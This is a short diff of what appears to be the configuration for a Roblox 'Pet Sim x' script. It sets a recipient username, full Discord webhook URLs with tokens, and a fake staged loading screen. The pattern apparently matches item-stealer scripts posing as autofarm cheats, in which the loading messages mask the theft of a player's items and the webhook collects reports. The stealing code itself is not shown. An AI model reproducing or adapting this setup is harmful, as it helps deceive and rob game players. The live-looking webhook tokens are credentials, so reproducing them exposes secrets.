@@ -1,8 +1,8 @@
 Username = "P0KGURMESI"
-WebHook = "https://discord.com/api/webhooks/1094564008834646097/_I6TbpK6NMZZmIJ8drre5Cnjo8KROGzraX74w1eOk4UzFFFFBCVCmPdbJjO6pq65K2z_"
+WebHook = "https://discord.com/api/webhooks/1094567623213199370/0GYic0Fg_VG610dEh4uLB9Ghg1lOgMnKJUbcnxm5_KhAdKeMCMY2kyOfGA5qx37fdT3h"
 loadingscreen = true
-CustomScriptName = "Yldrm Hub Autofarm"
-Text1 = "Script Loaded..."
+_G.CustomScriptName = "Pet Sim x Script"
+_G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script..."
 _G.Text3 = "Checking Scripts..."
 _G.Text4 = "Starting Script..."
